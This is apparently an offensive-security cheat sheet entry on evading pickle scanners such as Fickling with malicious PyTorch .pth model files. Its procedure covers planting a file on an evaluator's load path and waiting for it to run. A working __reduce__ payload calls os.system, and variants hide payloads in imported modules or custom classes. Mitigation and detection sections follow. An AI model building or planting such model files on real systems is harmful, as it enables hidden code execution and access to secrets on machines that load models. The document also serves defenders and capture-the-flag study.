---
topic: PyTorch — pickle detection evasion
tags: [ai, pytorch, pickle, fickling, deserialization]
---

# PyTorch — pickle detection evasion

**English** | [🌐 Español](pytorch-pickle-evasion.md)

## Concept

`torch.load` uses pickle and can execute code while loading a model. Tools such as Fickling inspect the bytecode, but a `.pth` file can use `runpy` or legitimate imports to run code during import and pass the check.

## When it applies

- An evaluator loads models with `torch.load` or imports from controlled paths.
- The process runs as root or has access to secrets.
- Detection relies only on Fickling or opcode signatures.

## Procedure

1. Identify the load point and the process user.
2. Build a `.pth` that executes code on import.
3. Check that the detection tool does not flag it.
4. Place it on the path consumed by the evaluator and wait for execution.

## Commands

```bash
# .pth executed when the model is imported
python3 - <<'PY'
import torch
class Evil:
    def __reduce__(self):
        return (__import__("os").system, ("id",))
torch.save(Evil(), "evil.pth")
PY
fickling evil.pth
# Safe load
python3 -c "import torch; torch.load('model.pth', weights_only=True)"
```

## Variants

- Use `runpy.run_path` inside a Lambda or `__setstate__`.
- Hide the payload in a legitimate module imported by the model.
- Abuse a `state_dict` with a custom class.

## Limitations

- `weights_only=True` blocks most payloads.
- The evaluator may run in an unprivileged container.
- An updated Fickling may detect more patterns.

## Mitigation

- Load only weights with `weights_only=True`.
- Use Safetensors or code-free formats.
- Run the evaluator without privileges or secrets.

## Detection

- Models importing modules or spawning processes on load.
- `.pth` files with `os.system` or `runpy` opcodes.
- Evaluators creating unexpected child processes.

## References

- [PyTorch — Security](https://pytorch.org/docs/stable/notes/security.html)
- [Fickling — GitHub](https://github.com/trailofbits/fickling)
- [0xdf — Blurry](https://0xdf.gitlab.io/2024/10/12/htb-blurry.html)
